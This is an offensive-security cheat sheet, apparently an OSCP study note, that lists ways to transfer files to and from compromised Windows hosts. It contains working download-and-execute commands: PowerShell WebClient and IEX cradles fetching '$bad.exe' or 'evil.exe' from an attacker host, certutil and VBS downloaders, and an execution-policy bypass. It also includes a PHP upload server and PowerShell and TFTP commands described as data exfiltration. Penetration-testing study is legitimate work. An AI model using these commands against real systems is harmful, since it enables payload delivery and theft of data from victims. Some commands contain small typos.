# Windows File Transfers
Check out [[Kali-Windows-Resources]] for selection of binaries and such to transfer! Other methods for [[File-Transfers]].

## FTP download
```bash
# copy a binary to /ftphome/; serve the binary on attackbox local ftp server then connect with target
sudo cp /usr/share/windows-resources/binaries/nc.exe /ftphome/
sudo systemctl restart pure-ftpd
```

## Netcat
[[Netcat-Cheatsheet]]
```powershell
# Listener on Windows system
nc -lvnp $PORT > tranfered.exe
# Push wget.exe onto windows system
nc -nv $IP $PORT < /usr/share/windows-resources/binaries/wget.exe
```

## Socat
Use [[Socat-Cheatsheet]], Host with:
```bash
sudo socat TCP4-LISTEN:$PORT,fork file:$filename
```
Transfer with
```powershell
socat TCP4:$IP:$PORT file:$filename,create
```

## Powershell
```powershell
powershell -c "(New-Object System.Net.WebClient).DownloadFile('http://$IP:$PORT/$bad.exe','$bad.exe')"
```
Or
```powershell
powershell.exe (New-Object System.Net.WebClient).DownloadFile('http://$IP:$PORT/$bad.exe','$bad.exe')
```
Download and execute without saving to disk
```powershell
powershell.exe IEX (New-Object System.Net.WebClient).DownloadString('http://$IP:$PORT/$bad.exe')`
```

## Non interactive Powershell
```powershell
echo $storageDir = $pwd > wget.ps1   
echo $webclient = New-Object System.Net.WebClient >> wget.ps1   
echo $url = "http://$IP:$PORT/$bad.exe" >> wget.ps1   
echo $file = "$bad.exe" >> wget.ps1   
echo $webclient.DownloadFile($url,$file) >> wget.ps1
```
Then
```powershell
powershell.exe -ExecutionPolicy Bypass -NoLogo -NonInteractive -NoProfile -File wget.ps1
```

## SMB with Impacket
[[Impacket-Cheatsheet]]
```bash
impacket-smbserver scriptserver $(pwd) -smb2support -user user -password pass
```
On remote:
```powershell
$pass = convertto-securestring 'pass' -AsPlainText -Force
$cred = New-Object System.Management.Automation.PSCredential('user', $pass)
New-PSDrive -Name user -PSProvider FileSystem -Credential $cred -Root \\$IP
```

```bash
python3 smbserver.py ROPNOP /path/to/exploit
copy \$IP\ROPNOP\exploit.exe
```

## CertUtil
```powershell
certutil.exe -urlcache -split -f "http://$IP/$FILE"
```

**TFTP** (Installed by default up to Windows XP and 2003, In Windows 7, 2008 and above needs to be explicitly added. For this reason tftp not ideal file transfer protocol in most situations.) [ref](https://github.com/pythonmaster41/Go-For-OSCP)
```powershell
# On attacker machine:
mkdir /tftp
chwon nobody: /tftp
atftpd --deamon --port 69 tftp
cp $FILE tftp
# On Windows:
tftp -i $IP GET $FILE
tftp -i $IP PUT $FILE
```

## Windows-File-transferVBS-script
BEWARE: "If creating on Linux and then transferto windows then you may face issue sometime, use unix2dos before you transfer it in this case." 
Hakluke.
```vb
# wget.bs
echo strUrl = WScript.Arguments.Item(0) > wget.vbs
echo StrFile = WScript.Arguments.Item(1) >> wget.vbs
echo Const HTTPREQUEST_PROXYSETTING_DEFAULT = 0 >> wget.vbs
echo Const HTTPREQUEST_PROXYSETTING_PRECONFIG = 0 >> wget.vbs
echo Const HTTPREQUEST_PROXYSETTING_DIRECT = 1 >> wget.vbs
echo Const HTTPREQUEST_PROXYSETTING_PROXY = 2 >> wget.vbs
echo Dim http, varByteArray, strData, strBuffer, lngCounter, fs, ts >> wget.vbs
echo Err.Clear >> wget.vbs
echo Set http = Nothing >> wget.vbs
echo Set http = CreateObject("WinHttp.WinHttpRequest.5.1") >> wget.vbs
echo If http Is Nothing Then Set http = CreateObject("WinHttp.WinHttpRequest") >> wget.vbs 
echo If http Is Nothing Then Set http = CreateObject("MSXML2.ServerXMLHTTP") >> wget.vbs 
echo If http Is Nothing Then Set http = CreateObject("Microsoft.XMLHTTP") >> wget.vbs
echo http.Open "GET", strURL, False >> wget.vbs
echo http.Send >> wget.vbs
echo varByteArray = http.ResponseBody >> wget.vbs
echo Set http = Nothing >> wget.vbs
echo Set fs = CreateObject("Scripting.FileSystemObject") >> wget.vbs
echo Set ts = fs.CreateTextFile(StrFile, True) >> wget.vbs
echo strData = "" >> wget.vbs
echo strBuffer = "" >> wget.vbs
echo For lngCounter = 0 to UBound(varByteArray) >> wget.vbs
echo ts.Write Chr(255 And Ascb(Midb(varByteArray,lngCounter + 1, 1))) >> wget.vbs
echo Next >> wget.vbs
echo ts.Close >> wget.vbs
```
Run with:
```powershell
cscript wget.vbs http://attackerip/evil.exe evil.exe
```

## exe2hex plus Powershell
Have a `.exe` convert into a hex string:
```bash
# Transform binary making it non-interactive 
exe2hex -x nc64.exe -p nc.cmd
```
Good old copy and paste into a shell on Windows machine.

## UPX

Debug `.exe` (32bit machines only) filessize < 64kb!
```powershell
upx -9 nc.exe
wine exe2bat.exe nc.exe nc.txt
```

## PHP script - Upload HTTP Server for Data Exfiltration

Host a http server, make directory owned by www-data
```bash
mkdir /var/www/uploads -p
chown www-data: /var/www/uploads 
```
Script to placed in /uploads/
```php
<?php
$uploaddir = '/var/www/uploads/';

$uploadfile = $uploaddir . $_FILES['file']['name'];

move_uploaded_file($_FILES['file']['tmp_name'], $uploadfile)
?>
```

Exfiltrate your way to a great day!
```powershell
powershell (New-Object System.Net.WebClient).UploadFile('http://$IP/upload.php', 'bad.exe')
```

## TFTP Upload Server for Data Exfiltration
```bash
apt install atftp
mkdir /tfp
shown nobody: /tftp
atftpd --daemon --port 69 /tftp
```

```powershell
tftp -i $ip put bigExfiltratedDataFile.nowmine
```

## Powercat
See [[Powercat-Cheatsheet]] for more, but to file transfers with powercat:
```powershell
powercat -c 10.10.10.10 -p 54321 -i C:\Users\Administrator\powercat.ps1
```

## References
[hakluke](https://hakluke.medium.com/haklukes-ultimate-oscp-guide-part-3-practical-hacking-tips-and-tricks-c38486f5fc97)
[pythonmaster41](https://github.com/pythonmaster41/Go-For-OSCP)
[hackersinterview](https://hackersinterview.com/oscp/oscp-cheatsheet-windows-file-transfer-techniques/)

[sushant747](https://sushant747.gitbooks.io/total-oscp-guide/content/transfering_files_to_windows.html)